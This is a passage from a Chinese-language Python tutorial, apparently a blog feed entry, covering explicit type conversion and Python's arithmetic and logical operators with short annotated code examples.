强制转换为int</span></span><br></pre></td></tr></table></figure><p>（3）显式类型转换注意事项</p><p>​不管什么值的int、float都可以转成str，str(x)将对象x转换成字符串。</p><p>​int转成float，增加小数部分；float转换成int，去除小数部分（123.65-&gt;123）。</p><p>​在把string类型转成基本数据类型，要确保str值能够转成有效的数据。</p><p>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">10</span></span><br><span class="line">j = <span class="built_in">float</span>(i)  <span class="comment"># 10.0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(i))  <span class="comment"># int</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(j))  <span class="comment"># float</span></span><br><span class="line"></span><br><span class="line">i = j + <span class="number">1</span>  <span class="comment"># 11.0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(i))  <span class="comment"># float</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(j))  <span class="comment"># float</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(i)  <span class="comment"># 11.0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(i))  <span class="comment"># 11</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(i))  <span class="comment"># float</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h1><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ol><li>算术运算符</li><li>赋值运算符</li><li>比较运算符</li><li>逻辑运算符</li><li>位运算符（二进制基础）</li></ol><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><ol><li>+，加</li><li>-，减</li><li>*，乘</li><li>&#x2F;，除</li><li>%，取余（取摸），7%5 &#x3D; 2（公式：a % b &#x3D; a-a &#x2F;&#x2F; b*b）</li><li>&#x2F;&#x2F;，取整除返回商的整数部分（向下取整）,9&#x2F;&#x2F;2 &#x3D; 4，-9&#x2F;&#x2F;2 &#x3D; -5</li><li>**，幂次方</li></ol><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><ol><li>and<ol><li>x and y</li><li>布尔“与”，如果x为False，返回x的值；否则返回y的值</li><li>注意：and只有当第一个为True，才会验证第二个</li></ol></li><li>or<ol><li>x or y</li><li>布尔“或”，如果x为True，返回x的值；否则返回y的值</li><li>注意：</li></ol></li><li>not<ol><li>not x</li><li>布尔“非”，如果x为True，返回False；否则返回True</li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">20</span></span><br><span class="line"><span class="built_in">print</span>(a <span class="keyword">and</span> b)  <span class="comment"># 20</span></span><br><span class="line"><span class="built_in">print</span>(a <span class="keyword">or</span> b)  <span class="comment"># 10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> (a <span class="keyword">or</span> b))  <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> (a <span class="keyword">and</span> b))  <span class="comment"># False</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
